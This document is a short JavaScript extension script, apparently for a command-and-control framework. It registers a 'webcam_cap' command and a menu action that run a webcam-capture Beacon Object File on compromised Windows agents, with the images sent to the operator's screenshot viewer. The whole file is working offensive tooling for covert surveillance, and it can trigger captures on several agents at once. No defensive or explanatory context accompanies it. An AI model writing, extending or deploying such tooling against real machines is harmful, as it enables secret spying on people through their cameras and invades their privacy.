var metadata = {
    name: "WebcamBOF",
    description: "Webcam capture capability implemented as a BOF by @codex_tf2"
};

/// COMMANDS

var cmd_webcam = ax.create_command("webcam_cap", "Capture webcam image inline using a BOF and send to screenshot viewer directly.", "webcam_cap");
cmd_webcam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/WebcamBOF." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: Webcam capture (BOF)");
});

var b_group = ax.create_commands_group("WebcamBOF", [cmd_webcam]);
ax.register_commands_group(b_group, ["beacon", "gopher", "kharon"], ["windows"], []);

/// MENU

let webcam_access_action = menu.create_action("Webcam", function(agents_id) {
    agents_id.forEach(id => ax.execute_command(id, "webcam_cap"));
});
menu.add_session_access(webcam_access_action, ["beacon"]);
